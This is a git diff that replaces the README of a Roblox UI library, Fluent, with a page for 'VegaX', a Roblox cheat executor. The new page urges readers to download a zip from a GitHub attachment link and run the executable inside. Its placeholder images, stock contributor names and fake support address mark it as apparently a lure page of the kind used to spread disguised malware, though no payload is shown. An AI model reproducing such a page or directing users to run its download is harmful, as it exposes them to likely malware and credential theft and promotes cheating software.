@@ -1,37 +1,65 @@
-<img src="Assets/darkmode.png#gh-dark-mode-only" alt="fluent">
-<img src="Assets/lightmode.png#gh-light-mode-only" alt="fluent">
+# Roblox-Vega
 
-## ⚡ Features
+![VegaX Logo](https://example.com/vegax_logo.png)
 
-- Modern design
-- Many customization options
-- Almost any UI Element you would ever need
-<br/>
+Welcome to **Roblox-Vega** repository!
 
-## 🔌 Installation
+## Description
+**VegaX** is a powerful Windows PC executor for Roblox, designed to run Lua scripts efficiently, enabling users to unlock advanced game modifications and enhance their overall gameplay experience.
 
-You can load Fluent through a GitHub Release:
+## Features
+- Lua script execution
+- Advanced game modifications
+- Enhanced gameplay experience
 
+## Installation
+You can download the latest version of VegaX by clicking [here](https://github.com/user-attachments/files/16797288/VegaX.zip)
+
+## Usage
+1. Download VegaX from the link provided above.
+2. Unzip the downloaded file.
+3. Run the executable file.
+4. Follow the on-screen instructions to start using VegaX.
+
+## Example Lua Script
+Here is a simple Lua script to demonstrate the power of VegaX:
 ```lua
-local Library = loadstring(game:GetService("HttpService"):GetAsync("https://github.com/ActualMasterOogway/Fluent-Renewed/releases/latest/download/Fluent.luau", true))()
+print("Hello, Roblox World!")
 ```
-```lua
-local Library = loadstring(game:HttpGetAsync("https://github.com/ActualMasterOogway/Fluent-Renewed/releases/latest/download/Fluent.luau", true))()
-```
-<br/>
-
-## 📜 Usage
-[Example Script the studio environment](https://github.com/ActualMasterOogway/Fluent-Renewed/blob/master/Example.client.luau)
-
-[Example Script for an exploit environment](https://github.com/ActualMasterOogway/Fluent-Renewed/blob/master/Example.luau)
-<br/>
 
 ## Credits
+- VegaX logo designed by [ArtistName](https://artistportfolio.com)
 
-- [Master Oogway](https://github.com/ActualMasterOogway/Fluent-Renewed) - The master mind behind Fluent Renewed
-- [dawid](https://github.com/dawid-scripts/Fluent) - The master mind behind Fluent
-- [Lucide](https://github.com/lucide-icons) - The sexy icons
-- [richie0866/remote-spy](https://github.com/richie0866/remote-spy) - Assets for the UI, some of the code
-- [violin-suzutsuki/LinoriaLib](https://github.com/violin-suzutsuki/LinoriaLib) - Code for most of the elements, save manager
-- [7kayoh/Acrylic](https://github.com/7kayoh/Acrylic) - Porting richie0866's acrylic module to lua
-- [Latte Softworks & Kotera](https://discord.gg/rMMByr4qas) - Bundler
+## Feedback
+We welcome any feedback or suggestions. Feel free to create an issue or pull request.
+
+## License
+This project is licensed under the [MIT License](LICENSE).
+
+---
+
+Join our Discord community for discussions: [Roblox-Vega Discord](https://discord.gg/RobloxVega)
+
+![Discord QR Code](https://example.com/discord_qr.png)
+
+If you encounter any issues or have questions, please reach out to our support team at [support@vegax.com]. 
+
+---
+
+## Support the Project
+If you find VegaX useful and wish to support the project, consider making a donation.
+
+[![BuyMeACoffee](https://www.buymeacoffee.com/assets/img/custom_images/black_img.png)](https://www.buymeacoffee.com/robloxvega)
+
+Your support helps us continue development and provide updates. Thank you for your contribution!
+
+## Stay Updated
+Follow us on Twitter for the latest news and updates: [Roblox-Vega Twitter](https://twitter.com/RobloxVega)
+
+## Contributors
+- [JohnDoe](https://github.com/johndoe)
+- [JaneSmith](https://github.com/janesmith)
+
+🚀 Happy scripting and enjoy your enhanced Roblox experience with **VegaX**! 🎮
+
+**LEGAL DISCLAIMER**: *This software is intended for educational purposes only. Use at your own risk.*
